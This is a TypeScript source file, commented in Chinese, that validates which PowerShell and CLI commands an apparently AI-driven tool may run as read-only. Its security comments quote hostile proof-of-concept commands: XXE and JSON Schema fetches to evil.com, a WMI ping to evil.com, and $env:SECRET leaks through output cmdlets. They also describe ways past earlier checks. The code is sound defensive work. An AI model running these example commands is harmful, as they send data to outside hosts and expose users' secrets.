// PowerShell 只读命令校验:cmdlet 白名单 + 参数级泄漏防护 + git/gh/docker/dotnet 分发。
// 对照移植自 Claude packages/builtin-tools/src/tools/PowerShellTool/readOnlyValidation.ts。
// cmdlet 大小写不敏感;所有匹配均按小写进行。

import type { ParsedCommandElement, ParsedPowerShellCommand } from '../psParser.js';
import {
  COMMON_ALIASES,
  deriveSecurityFlags,
  getPipelineSegments,
  isNullRedirectionTarget,
  isPowerShellParameter,
} from '../psParser.js';
import type { ExternalCommandConfig } from './readOnlyCommands.js';
import {
  DOCKER_READ_ONLY_COMMANDS,
  EXTERNAL_READONLY_COMMANDS,
  GH_READ_ONLY_COMMANDS,
  GIT_READ_ONLY_COMMANDS,
  validateFlags,
} from './readOnlyCommands.js';
import { COMMON_PARAMETERS } from './commonParameters.js';

type ParsedStatement = ParsedPowerShellCommand['statements'][number];

const DOTNET_READ_ONLY_FLAGS = new Set([
  '--version',
  '--info',
  '--list-runtimes',
  '--list-sdks',
]);

type CommandConfig = {
  /** 该命令的安全子命令或旗标 */
  safeFlags?: string[];
  /**
   * 为 true 时,无论 safeFlags 如何都允许所有旗标。
   * 用于整个旗标面都是只读的命令(如 hostname)。
   * 没有它,空的/缺失的 safeFlags 会拒绝所有旗标(仅允许位置参数)。
   */
  allowAllFlags?: boolean;
  /** 对原始命令的正则约束 */
  regex?: RegExp;
  /** 附加校验回调——命令危险时返回 true */
  additionalCommandIsDangerousCallback?: (
    command: string,
    element?: ParsedCommandElement,
  ) => boolean;
};

/**
 * 打印类/会把参数强制转换到 stdout/stderr 的 cmdlet 共用的回调。
 * `Write-Output $env:SECRET` 直接把它打印出来;`Start-Sleep $env:SECRET`
 * 经类型转换错误泄露("Cannot convert value 'sk-...' to System.Double")。
 * Bash 的 echo 正则按 token 白名单安全字符。
 *
 * 两层检查:
 * 1. elementTypes 白名单——StringConstant(字面量)+ Parameter(旗标名)。
 *    拒绝 Variable、Other(HashtableAst/ConvertExpressionAst/
 *    BinaryExpressionAst 都映射为 Other)、ScriptBlock、SubExpression、
 *    ExpandableString。与 SAFE_PATH_ELEMENT_TYPES 同一模式。
 * 2. 冒号绑定的参数值——`-InputObject:$env:SECRET` 产生单个
 *    CommandParameterAst;VariableExpressionAst 是它的 .Argument 子节点,
 *    不是独立的 CommandElement。elementTypes = [..., 'Parameter'],白名单
 *    通过。查询 children[] 拿到 .Argument 的映射类型;凡不是
 *    StringConstant 的(Variable、包裹任意管道的 ParenExpression、
 *    Hashtable 等)都是泄露通道。
 */
export function argLeaksValue(
  _cmd: string,
  element?: ParsedCommandElement,
): boolean {
  const argTypes = (element?.elementTypes ?? []).slice(1);
  const args = element?.args ?? [];
  const children = element?.children;
  for (let i = 0; i < argTypes.length; i++) {
    if (argTypes[i] !== 'StringConstant' && argTypes[i] !== 'Parameter') {
      // ArrayLiteralAst(`Select-Object Name, Id`)映射为 'Other'——解析脚本
      // 只为 CommandParameterAst.Argument 填充 children,无法检查其元素。
      // 退化为对 extent 文本做字符串考古:Hashtable 含 `@{`、ParenExpr 含
      // `(`、变量含 `$`、类型字面量含 `[`、scriptblock 含 `{`。裸标识符
      // 逗号列表一样都不含。`Name, $x` 仍会因 `$` 被拒绝。
      if (!/[$(@{[]/.test(args[i] ?? '')) {
        continue;
      }
      return true;
    }
    if (argTypes[i] === 'Parameter') {
      const paramChildren = children?.[i];
      if (paramChildren) {
        if (paramChildren.some(c => c.type !== 'StringConstant')) {
          return true;
        }
      } else {
        // 兜底:对参数文本做字符串考古(针对 children 之前的解析器)。
        // 拒绝 `$`(变量)、`(`(ParenExpressionAst)、`@`(哈希/数组下标)、
        // `{`(scriptblock)、`[`(类型字面量/静态方法)。
        const arg = args[i] ?? '';
        const colonIdx = arg.indexOf(':');
        if (colonIdx > 0 && /[$(@{[]/.test(arg.slice(colonIdx + 1))) {
          return true;
        }
      }
    }
  }
  return false;
}

/**
 * 被视为只读的 PowerShell cmdlet 白名单。
 * 每个 cmdlet 映射到其配置,含安全旗标。
 *
 * 注意:PowerShell cmdlet 大小写不敏感,因此键一律小写存储,
 * 匹配前对输入做规范化。
 *
 * 使用 Object.create(null) 防原型链污染——攻击者控制的命令名如
 * 'constructor' 或 '__proto__' 必须拿到 undefined,而不是继承自
 * Object.prototype 的属性。与 parser 中 COMMON_ALIASES 同一防线。
 */
export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
  Object.create(null) as Record<string, CommandConfig>,
  {
    // =========================================================================
    // PowerShell cmdlet —— 文件系统(只读)
    // =========================================================================
    'get-childitem': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Filter',
        '-Include',
        '-Exclude',
        '-Recurse',
        '-Depth',
        '-Name',
        '-Force',
        '-Attributes',
        '-Directory',
        '-File',
        '-Hidden',
        '-ReadOnly',
        '-System',
      ],
    },
    'get-content': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-TotalCount',
        '-Head',
        '-Tail',
        '-Raw',
        '-Encoding',
        '-Delimiter',
        '-ReadCount',
      ],
    },
    'get-item': {
      safeFlags: ['-Path', '-LiteralPath', '-Force', '-Stream'],
    },
    'get-itemproperty': {
      safeFlags: ['-Path', '-LiteralPath', '-Name'],
    },
    'test-path': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-PathType',
        '-Filter',
        '-Include',
        '-Exclude',
        '-IsValid',
        '-NewerThan',
        '-OlderThan',
      ],
    },
    'resolve-path': {
      safeFlags: ['-Path', '-LiteralPath', '-Relative'],
    },
    'get-filehash': {
      safeFlags: ['-Path', '-LiteralPath', '-Algorithm', '-InputStream'],
    },
    'get-acl': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Audit',
        '-Filter',
        '-Include',
        '-Exclude',
      ],
    },

    // =========================================================================
    // PowerShell cmdlet —— 导航(只读,只改变工作目录)
    // =========================================================================
    'set-location': {
      safeFlags: ['-Path', '-LiteralPath', '-PassThru', '-StackName'],
    },
    'push-location': {
      safeFlags: ['-Path', '-LiteralPath', '-PassThru', '-StackName'],
    },
    'pop-location': {
      safeFlags: ['-PassThru', '-StackName'],
    },

    // =========================================================================
    // PowerShell cmdlet —— 文本搜索/过滤(只读)
    // =========================================================================
    'select-string': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Pattern',
        '-InputObject',
        '-SimpleMatch',
        '-CaseSensitive',
        '-Quiet',
        '-List',
        '-NotMatch',
        '-AllMatches',
        '-Encoding',
        '-Context',
        '-Raw',
        '-NoEmphasis',
      ],
    },

    // =========================================================================
    // PowerShell cmdlet —— 数据转换(纯变换,无副作用)
    // =========================================================================
    'convertto-json': {
      safeFlags: [
        '-InputObject',
        '-Depth',
        '-Compress',
        '-EnumsAsStrings',
        '-AsArray',
      ],
    },
    'convertfrom-json': {
      safeFlags: ['-InputObject', '-Depth', '-AsHashtable', '-NoEnumerate'],
    },
    'convertto-csv': {
      safeFlags: [
        '-InputObject',
        '-Delimiter',
        '-NoTypeInformation',
        '-NoHeader',
        '-UseQuotes',
      ],
    },
    'convertfrom-csv': {
      safeFlags: ['-InputObject', '-Delimiter', '-Header', '-UseCulture'],
    },
    'convertto-xml': {
      safeFlags: ['-InputObject', '-Depth', '-As', '-NoTypeInformation'],
    },
    'convertto-html': {
      safeFlags: [
        '-InputObject',
        '-Property',
        '-Head',
        '-Title',
        '-Body',
        '-Pre',
        '-Post',
        '-As',
        '-Fragment',
      ],
    },
    'format-hex': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-InputObject',
        '-Encoding',
        '-Count',
        '-Offset',
      ],
    },

    // =========================================================================
    // PowerShell cmdlet —— 对象检查与加工(只读)
    // =========================================================================
    'get-member': {
      safeFlags: [
        '-InputObject',
        '-MemberType',
        '-Name',
        '-Static',
        '-View',
        '-Force',
      ],
    },
    'get-unique': {
      safeFlags: ['-InputObject', '-AsString', '-CaseInsensitive', '-OnType'],
    },
    'compare-object': {
      safeFlags: [
        '-ReferenceObject',
        '-DifferenceObject',
        '-Property',
        '-SyncWindow',
        '-CaseSensitive',
        '-Culture',
        '-ExcludeDifferent',
        '-IncludeEqual',
        '-PassThru',
      ],
    },
    // 安全:select-xml 已移除。XML 外部实体(XXE)解析可通过 -Content 或
    // -Xml 中 DOCTYPE SYSTEM/PUBLIC 引用触发网络请求。
    // `Select-Xml -Content '<!DOCTYPE x [<!ENTITY e SYSTEM
    // "http://evil.com/x">]><x>&e;</x>' -XPath '/'` 会发出 GET 请求。
    // PowerShell 的 XmlDocument.LoadXml 默认不禁用实体解析。
    // 移除后强制弹确认。
    'join-string': {
      safeFlags: [
        '-InputObject',
        '-Property',
        '-Separator',
        '-OutputPrefix',
        '-OutputSuffix',
        '-SingleQuote',
        '-DoubleQuote',
        '-FormatString',
      ],
    },
    // 安全:Test-Json 已移除。-Schema(位置 1)接受带 $ref 指向外部 URL 的
    // JSON Schema——Test-Json 会去抓取(网络请求)。safeFlags 只校验显式
    // 旗标,不校验位置绑定:`Test-Json '{}' '{"$ref":"http://evil.com"}'`
    // → 位置 1 绑定到 -Schema → safeFlags 检查看到两个非旗标参数,都跳过
    // → 自动放行。
    'get-random': {
      safeFlags: [
        '-InputObject',
        '-Minimum',
        '-Maximum',
        '-Count',
        '-SetSeed',
        '-Shuffle',
      ],
    },

    // =========================================================================
    // PowerShell cmdlet —— 路径工具(只读)
    // =========================================================================
    // convert-path 的全部职责就是解析文件系统路径。它现在在
    // CMDLET_PATH_CONFIG 中做正式路径校验,因此这里的 safeFlags 只列出
    // 路径参数(由 CMDLET_PATH_CONFIG 校验)。
    'convert-path': {
      safeFlags: ['-Path', '-LiteralPath'],
    },
    'join-path': {
      // -Resolve 已移除:它会触碰文件系统验证拼接路径存在,但该路径未经
      // 允许目录校验。没有 -Resolve 时 Join-Path 是纯字符串操作。
      safeFlags: ['-Path', '-ChildPath', '-AdditionalChildPath'],
    },
    'split-path': {
      // -Resolve 已移除:理由同 join-path。没有 -Resolve 时 Split-Path 是
      // 纯字符串操作。
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Qualifier',
        '-NoQualifier',
        '-Parent',
        '-Leaf',
        '-LeafBase',
        '-Extension',
        '-IsAbsolute',
      ],
    },

    // =========================================================================
    // PowerShell cmdlet —— 其他系统信息(只读)
    // =========================================================================
    // 注意:Get-Clipboard 被刻意排除——它可能暴露用户复制的密码、API Key 等
    // 敏感数据。Bash 同样不自动放行剪贴板命令(pbpaste、xclip 等)。
    'get-hotfix': {
      safeFlags: ['-Id', '-Description'],
    },
    'get-itempropertyvalue': {
      safeFlags: ['-Path', '-LiteralPath', '-Name'],
    },
    'get-psprovider': {
      safeFlags: ['-PSProvider'],
    },

    // =========================================================================
    // PowerShell cmdlet —— 进程/系统信息
    // =========================================================================
    'get-process': {
      safeFlags: [
        '-Name',
        '-Id',
        '-Module',
        '-FileVersionInfo',
        '-IncludeUserName',
      ],
    },
    'get-service': {
      safeFlags: [
        '-Name',
        '-DisplayName',
        '-DependentServices',
        '-RequiredServices',
        '-Include',
        '-Exclude',
      ],
    },
    'get-computerinfo': {
      allowAllFlags: true,
    },
    'get-host': {
      allowAllFlags: true,
    },
    'get-date': {
      safeFlags: ['-Date', '-Format', '-UFormat', '-DisplayHint', '-AsUTC'],
    },
    'get-location': {
      safeFlags: ['-PSProvider', '-PSDrive', '-Stack', '-StackName'],
    },
    'get-psdrive': {
      safeFlags: ['-Name', '-PSProvider', '-Scope'],
    },
    // 安全:Get-Command 已从白名单移除。-Name(位置 0,ValueFromPipeline=true)
    // 会触发模块自动加载,从而运行 .psm1 初始化代码。链式攻击:预先在
    // PSModulePath 放置模块,触发自动加载。此前尝试过从 safeFlags 移除
    // -Name/-Module 并拒绝位置 StringConstant,但管道输入
    // (`'EvilCmdlet' | Get-Command`)完全绕过回调,因为 args 为空。
    // 移除后强制弹确认。需要的用户可以加显式 allow 规则。
    'get-module': {
      safeFlags: [
        '-Name',
        '-ListAvailable',
        '-All',
        '-FullyQualifiedName',
        '-PSEdition',
      ],
    },
    // 安全:Get-Help 已从白名单移除。与 Get-Command 同样的模块自动加载
    // 隐患(-Name 的 ValueFromPipeline=true,管道输入绕过参数级回调)。
    // 移除后强制弹确认。
    'get-alias': {
      safeFlags: ['-Name', '-Definition', '-Scope', '-Exclude'],
    },
    'get-history': {
      safeFlags: ['-Id', '-Count'],
    },
    'get-culture': {
      allowAllFlags: true,
    },
    'get-uiculture': {
      allowAllFlags: true,
    },
    'get-timezone': {
      safeFlags: ['-Name', '-Id', '-ListAvailable'],
    },
    'get-uptime': {
      allowAllFlags: true,
    },

    // =========================================================================
    // PowerShell cmdlet —— 输出与杂项(无副作用)
    // =========================================================================
    // 与 Bash 对齐:`echo` 通过自定义正则自动放行(BashTool
    // readOnlyValidation.ts:~1517)。该正则按参数白名单安全字符。
    // 它拦截的三种攻击形状见上方 argLeaksValue。
    'write-output': {
      safeFlags: ['-InputObject', '-NoEnumerate'],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Write-Host 绕过管道(PS5+ 的 Information 流),能力严格弱于
    // Write-Output——但 `Write-Host $env:SECRET` 这种经显示泄露同样适用。
    'write-host': {
      safeFlags: [
        '-Object',
        '-NoNewline',
        '-Separator',
        '-ForegroundColor',
        '-BackgroundColor',
      ],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // 与 Bash 对齐:`sleep` 在 READONLY_COMMANDS 中(BashTool
    // readOnlyValidation.ts:~1146)。运行时零副作用——但
    // `Start-Sleep $env:SECRET` 经类型转换错误泄露。同样的防护。
    'start-sleep': {
      safeFlags: ['-Seconds', '-Milliseconds', '-Duration'],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Format-* 与 Measure-Object 在安全评审发现它们都接受计算属性哈希表
    // (与 Where-Object 同一利用面——I4 回归)后从 SAFE_OUTPUT_CMDLETS 移到
    // 这里。isSafeOutputCommand 是纯名字检查,会在参数校验之前就把它们从
    // 审批循环中滤掉。在这里由 argLeaksValue 校验参数:
    //   | Format-Table               → 无参数 → 安全 → 放行
    //   | Format-Table Name, CPU     → StringConstant 位置参数 → 安全 → 放行
    //   | Format-Table $env:SECRET   → Variable elementType → 拦截 → 转交
    //   | Format-Table @{N='x';E={}} → Other(HashtableAst)→ 拦截 → 转交
    //   | Measure-Object -Property $env:SECRET → 同上 → 拦截
    // allowAllFlags:argLeaksValue 校验参数 elementTypes(Variable/Hashtable/
    // ScriptBlock → 拦截)。Format-* 自身的旗标(-AutoSize、-GroupBy、-Wrap
    // 等)都是纯显示。没有 allowAllFlags,空 safeFlags 的默认行为会拒绝所有
    // 旗标——`Format-Table -AutoSize` 会过度弹确认。
    'format-table': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-list': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-wide': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-custom': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'measure-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Select-Object/Sort-Object/Group-Object/Where-Object:与 format-* 同样
    // 的计算属性哈希表面(about_Calculated_Properties)。已从
    // SAFE_OUTPUT_CMDLETS 移除,但此前没收进这里,导致
    // `Get-Process | Select-Object Name` 过度弹确认。argLeaksValue 以同样
    // 方式处理:StringConstant 属性名通过(`Select-Object Name`),
    // HashtableAst/ScriptBlock/Variable 参数拦截(`Select-Object @{N='x';E={...}}`、
    // `Where-Object { ... }`)。allowAllFlags:-First/-Last/-Skip/-Descending/
    // -Property/-EQ 等都是选择/排序旗标——自身无害;argLeaksValue 抓住危险
    // 的参数*值*。
    'select-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'sort-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'group-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'where-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Out-String/Out-Host 从 SAFE_OUTPUT_CMDLETS 移到此处——两者都接受
    // -InputObject,泄露方式与 Write-Output 相同。
    // `Get-Process | Out-String -InputObject $env:SECRET` → 秘密被打印。
    // allowAllFlags:-Width/-Stream/-Paging/-NoNewline 是显示旗标;
    // argLeaksValue 抓住危险的 -InputObject *值*。
    'out-string': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'out-host': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },

    // =========================================================================
    // PowerShell cmdlet —— 网络信息(只读)
    // =========================================================================
    'get-netadapter': {
      safeFlags: [
        '-Name',
        '-InterfaceDescription',
        '-InterfaceIndex',
        '-Physical',
      ],
    },
    'get-netipaddress': {
      safeFlags: [
        '-InterfaceIndex',
        '-InterfaceAlias',
        '-AddressFamily',
        '-Type',
      ],
    },
    'get-netipconfiguration': {
      safeFlags: ['-InterfaceIndex', '-InterfaceAlias', '-Detailed', '-All'],
    },
    'get-netroute': {
      safeFlags: [
        '-InterfaceIndex',
        '-InterfaceAlias',
        '-AddressFamily',
        '-DestinationPrefix',
      ],
    },
    'get-dnsclientcache': {
      // 安全:-CimSession/-ThrottleLimit 已排除。-CimSession 连接远程主机
      // (网络请求)。此前空配置 = 所有旗标放行。
      safeFlags: ['-Entry', '-Name', '-Type', '-Status', '-Section', '-Data'],
    },
    'get-dnsclient': {
      safeFlags: ['-InterfaceIndex', '-InterfaceAlias'],
    },

    // =========================================================================
    // PowerShell cmdlet —— 事件日志(只读)
    // =========================================================================
    'get-eventlog': {
      safeFlags: [
        '-LogName',
        '-Newest',
        '-After',
        '-Before',
        '-EntryType',
        '-Index',
        '-InstanceId',
        '-Message',
        '-Source',
        '-UserName',
        '-AsBaseObject',
        '-List',
      ],
    },
    'get-winevent': {
      // 安全:-FilterXml/-FilterHashtable 已移除。-FilterXml 接受带 DOCTYPE
      // 外部实体的 XML(XXE → 网络请求)。-FilterHashtable 本会被
      // elementTypes 的 'Other' 检查兜住(@{} 是 HashtableAst),但这里显式
      // 移除。与 Select-Xml(上方已移除)同一 XXE 隐患。-FilterXPath 保留
      // (纯字符串模式,无实体解析)。-ComputerName/-Credential 也被隐式排除。
      safeFlags: [
        '-LogName',
        '-ListLog',
        '-ListProvider',
        '-ProviderName',
        '-Path',
        '-MaxEvents',
        '-FilterXPath',
        '-Force',
        '-Oldest',
      ],
    },

    // =========================================================================
    // PowerShell cmdlet —— WMI/CIM
    // =========================================================================
    // 安全:Get-WmiObject 与 Get-CimInstance 已移除。它们会经
    // Win32_PingStatus 之类的类主动触发网络请求(枚举时发送 ICMP),还能
    // 经 -ComputerName/CimSession 查询远程计算机。-Class/-ClassName/
    // -Filter/-Query 接受我们无法静态校验的任意 WMI 类/WQL。
    //   PoC:Get-WmiObject -Class Win32_PingStatus -Filter 'Address="evil.com"'
    //   → 向 evil.com 发送 ICMP(DNS 泄露 + 潜在 NTLM 认证泄露)。
    // WMI 还可能自动加载 provider DLL(初始化代码)。移除后强制弹确认。
    // get-cimclass 保留——只列出类元数据,不做实例枚举。
    'get-cimclass': {
      safeFlags: [
        '-ClassName',
        '-Namespace',
        '-MethodName',
        '-PropertyName',
        '-QualifierName',
      ],
    },

    // =========================================================================
    // Git —— 使用共享外部命令校验,逐旗标检查
    // =========================================================================
    git: {},

    // =========================================================================
    // GitHub CLI(gh)—— 使用共享外部命令校验
    // =========================================================================
    gh: {},

    // =========================================================================
    // Docker —— 使用共享外部命令校验
    // =========================================================================
    docker: {},

    // =========================================================================
    // Windows 专属系统命令
    // =========================================================================
    ipconfig: {
      // 安全:在 macOS 上,`ipconfig set <iface> <mode>` 会配置网络(写系统
      // 配置)。safeFlags 只校验旗标,位置参数被跳过。拒绝任何位置参数——
      // 只允许裸 `ipconfig` 或 `ipconfig /all`(只读显示)。Windows 的
      // ipconfig 只用 /旗标(显示),macOS 的 ipconfig 用子命令
      // (get/set/waitall)。
      safeFlags: ['/all', '/displaydns', '/allcompartments'],
      additionalCommandIsDangerousCallback: (
        _cmd: string,
        element?: ParsedCommandElement,
      ) => {
        return (element?.args ?? []).some(
          a => !a.startsWith('/') && !a.startsWith('-'),
        );
      },
    },
    netstat: {
      safeFlags: [
        '-a',
        '-b',
        '-e',
        '-f',
        '-n',
        '-o',
        '-p',
        '-q',
        '-r',
        '-s',
        '-t',
        '-x',
        '-y',
      ],
    },
    systeminfo: {
      safeFlags: ['/FO', '/NH'],
    },
    tasklist: {
      safeFlags: ['/M', '/SVC', '/V', '/FI', '/FO', '/NH'],
    },
    // where.exe:Windows 的 PATH 定位器,等价 bash 的 `which`。经
    // isAllowlistedCommand 中 nameType 闸门的 SAFE_EXTERNAL_EXES 旁路到达
    // 这里。所有旗标都是只读(/R /F /T /Q),与 bash 对 `which` 的处理一致
    // (BashTool READONLY_COMMANDS)。
    'where.exe': {
      allowAllFlags: true,
    },
    hostname: {
      // 安全:Linux/macOS 上 `hostname NAME` 会设置主机名(写系统配置)。
      // `hostname -F FILE` / `--file=FILE` 也会从文件设置。
      // 只允许裸 `hostname` 与已知只读旗标。
      safeFlags: ['-a', '-d', '-f', '-i', '-I', '-s', '-y', '-A'],
      additionalCommandIsDangerousCallback: (
        _cmd: string,
        element?: ParsedCommandElement,
      ) => {
        // 拒绝任何位置(非旗标)参数——那会设置主机名。
        return (element?.args ?? []).some(a => !a.startsWith('-'));
      },
    },
    whoami: {
      safeFlags: [
        '/user',
        '/groups',
        '/claims',
        '/priv',
        '/logonid',
        '/all',
        '/fo',
        '/nh',
      ],
    },
    ver: {
      allowAllFlags: true,
    },
    arp: {
      safeFlags: ['-a', '-g', '-v', '-N'],
    },
    route: {
      safeFlags: ['print', 'PRINT', '-4', '-6'],
      additionalCommandIsDangerousCallback: (
        _cmd: string,
        element?: ParsedCommandElement,
      ) => {
        // 安全:route.exe 语法是 `route [-f] [-p] [-4|-6] VERB [args...]`。
        // 第一个非旗标位置参数是动词。`route add 10.0.0.0 mask 255.0.0.0
        // 192.168.1.1 print` 会添加路由(print 只是结尾的显示修饰符)。
        // 旧检查用 args.some('print'),在任何位置匹配到 'print' 都算——
        // 对位置不敏感。
        if (!element) {
          return true;
        }
        const verb = element.args.find(a => !a.startsWith('-'));
        return verb?.toLowerCase() !== 'print';
      },
    },
    // netsh:刻意不加白名单。PR #22060 中三轮 denylist 补洞(动词位置 →
    // 破折号旗标 → 斜杠旗标 → 更多动词)证明其语法太复杂,无法安全地加
    // 白名单:3 层上下文嵌套(`netsh interface ipv4 show addresses`)、
    // 双前缀旗标(-f 与 /f)、经 -f 与 `exec` 的脚本执行、经 -r 的远程
    // RPC、离线模式提交、wlan connect/disconnect 等。每次扩充 denylist
    // 都暴露出新的缺口。`route` 保留——`route print` 是唯一的只读形式,
    // 语法是简单的单动词位置。
    getmac: {
      safeFlags: ['/FO', '/NH', '/V'],
    },

    // =========================================================================
    // 跨平台 CLI 工具
    // =========================================================================
    // 文件检查
    // 安全:file -C 编译 magic 数据库并写盘。只允许内省旗标;拒绝
    // -C / --compile / -m / --magic-file。
    file: {
      safeFlags: [
        '-b',
        '--brief',
        '-i',
        '--mime',
        '-L',
        '--dereference',
        '--mime-type',
        '--mime-encoding',
        '-z',
        '--uncompress',
        '-p',
        '--preserve-date',
        '-k',
        '--keep-going',
        '-r',
        '--raw',
        '-v',
        '--version',
        '-0',
        '--print0',
        '-s',
        '--special-files',
        '-l',
        '-F',
        '--separator',
        '-e',
        '-P',
        '-N',
        '--no-pad',
        '-E',
        '--extension',
      ],
    },
    tree: {
      safeFlags: ['/F', '/A', '/Q', '/L'],
    },
    findstr: {
      safeFlags: [
        '/B',
        '/E',
        '/L',
        '/R',
        '/S',
        '/I',
        '/X',
        '/V',
        '/N',
        '/M',
        '/O',
        '/P',
        // 旗标匹配会在比较前剥掉 ':'(如 /C:pattern → /C),
        // 因此这些条目不得带结尾冒号。
        '/C',
        '/G',
        '/D',
        '/A',
      ],
    },

    // =========================================================================
    // 包管理器 —— 使用共享外部命令校验
    // =========================================================================
    dotnet: {},

    // 安全:man 与 help 的直接条目已移除。它们别名到 Get-Help(同样已
    // 移除——见上)。没有这些条目,lookupAllowlist 经 COMMON_ALIASES 解析
    // 到 'get-help',而它不在白名单 → 弹确认。与 Get-Help 同一模块自动
    // 加载隐患。
  },
);

/**
 * 可以接收管道输入的安全输出/格式化 cmdlet。
 * 以小写规范 cmdlet 名存储。
 */
const SAFE_OUTPUT_CMDLETS = new Set([
  'out-null',
  // 不含 out-string/out-host——两者都接受 -InputObject,泄露参数的方式与
  // Write-Output 相同。已移到 CMDLET_ALLOWLIST 并配 argLeaksValue。
  // `Get-Process | Out-String -InputObject $env:SECRET` —— Out-String 此前
  // 按名字被滤掉,$env 参数从未被校验。
  // out-null 保留:它丢弃一切,没有 -InputObject 泄露。
  // 不含 foreach-object / where-object / select-object / sort-object /
  // group-object / format-table / format-list / format-wide / format-custom /
  // measure-object——它们全都接受计算属性哈希表或 scriptblock 谓词,
  // 会在运行时求值任意表达式(about_Calculated_Properties)。例:
  //   Where-Object @{k=$env:SECRET}       —— HashtableAst 参数,'Other' elementType
  //   Select-Object @{N='x';E={...}}      —— 计算属性 scriptblock
  //   Format-Table $env:SECRET            —— 位置 -Property,作为表头打印
  //   Measure-Object -Property $env:SECRET —— 经 "property 'sk-...' not found" 泄露
  //   ForEach-Object { $env:PATH='e' }    —— 任意脚本体
  // isSafeOutputCommand 是纯名字检查——第 5 步会在参数校验运行之前就把这些
  // 从审批循环中滤掉。把它们留在这里,全安全输出的管道尾会在 subCommands
  // 为空时自动放行,无论参数里是什么。移除后管道尾强制走参数级校验
  // (哈希表是 'Other' elementType → 在 isAllowlistedCommand 的白名单失败
  // → ask;裸 $var 是 'Variable' → 同理)。
  //
  // 不含 write-output——管道首位的 $env:VAR 是 VariableExpressionAst,被
  // getSubCommandsForPermissionCheck 跳过(非 CommandAst)。若 write-output
  // 在这里,`$env:SECRET | Write-Output` → WO 被按 safe-output 滤掉 →
  // subCommands 为空 → 自动放行 → 秘密被打印。CMDLET_ALLOWLIST 条目处理
  // 直接的 `Write-Output 'literal'`。
]);

/**
 * 从 SAFE_OUTPUT_CMDLETS 移到 CMDLET_ALLOWLIST 并配 argLeaksValue 的
 * cmdlet。它们是管道尾变换器(Format-*、Measure-Object、Select-Object 等),
 * 此前按纯名字被滤为 safe-output。现在要求参数校验(argLeaksValue 拦截
 * 计算属性哈希表 / scriptblock / 变量参数)。
 *
 * 供 isAllowlistedPipelineTail 在 checkPermissionMode 与 isReadOnlyCommand
 * 的窄兜底中使用——这些调用方需要与 SAFE_OUTPUT_CMDLETS 相同的"跳过无害
 * 管道尾"行为,但要带 argLeaksValue 防护。
 */
const PIPELINE_TAIL_CMDLETS = new Set([
  'format-table',
  'format-list',
  'format-wide',
  'format-custom',
  'measure-object',
  'select-object',
  'sort-object',
  'group-object',
  'where-object',
  'out-string',
  'out-host',
]);

/**
 * 允许通过 nameType='application' 闸门的外部 .exe 名。
 *
 * classifyCommandName 对任何含点的名字返回 'application',而
 * isAllowlistedCommand 的 nameType 闸门在查白名单之前就拒绝它。该闸门
 * 存在是为了拦截 scripts\Get-Process → stripModulePrefix →
 * cmd.name='Get-Process' 这种伪造。但它也会误伤良性的 PATH 解析 .exe 名,
 * 如 where.exe(bash `which` 等价物——纯读取,无危险旗标)。
 *
 * 安全:旁路检查 cmd.text 的原始首个 token,而不是 cmd.name。
 * stripModulePrefix 会把 scripts\where.exe 折叠成 cmd.name='where.exe',
 * 但 cmd.text 保留原始的 'scripts\where.exe ...'。匹配 cmd.text 的首个
 * token 可挫败这种伪造——只有裸 `where.exe`(PATH 查找)能过。
 *
 * 这里的每个条目都必须在 CMDLET_ALLOWLIST 中有对应条目做旗标校验。
 */
const SAFE_EXTERNAL_EXES = new Set(['where.exe']);

/**
 * Windows PATHEXT 中由 PowerShell 经 PATH 查找解析的扩展名。
 * `git.exe`、`git.cmd`、`git.bat`、`git.com` 在运行时都调用 git,
 * 必须解析到同一个规范名,git 安全防护才能触发。
 * .ps1 被刻意排除——名为 git.ps1 的脚本不是 git 二进制,也不会触发
 * git 的 hook 机制。
 */
const WINDOWS_PATHEXT = /\.(exe|cmd|bat|com)$/;

/**
 * 用 COMMON_ALIASES 把命令名解析为规范 cmdlet 名。
 * 对无路径的名字剥掉 Windows 可执行扩展名(.exe、.cmd、.bat、.com),
 * 使 `git.exe` 规范化为 `git` 并触发 git 安全防护
 * (powershellPermissions.ts 的 hasGitSubCommand)。安全:只在名字不含
 * 路径分隔符时剥——`scripts\git.exe` 是相对路径(运行本地脚本,不是
 * PATH 解析的 git),不得规范化为 `git`。返回小写规范名。
 */
export function resolveToCanonical(name: string): string {
  let lower = name.toLowerCase();
  // 只对裸名剥 PATHEXT——路径运行的是指定文件,而不是防护所针对的
  // PATH 解析可执行文件。
  if (!lower.includes('\\') && !lower.includes('/')) {
    lower = lower.replace(WINDOWS_PATHEXT, '');
  }
  const alias = COMMON_ALIASES[lower];
  if (alias) {
    return alias.toLowerCase();
  }
  return lower;
}

/**
 * 检查命令名(别名解析后)是否会改变同一复合命令中后续语句的路径解析
 * 命名空间。
 *
 * 覆盖两类:
 * 1. 改 cwd 的 cmdlet:Set-Location、Push-Location、Pop-Location(及别名
 *    cd、sl、chdir、pushd、popd)。后续相对路径从新 cwd 解析。
 * 2. 创建 PSDrive 的 cmdlet:New-PSDrive(及 Windows 上的别名 ndr、mount)。
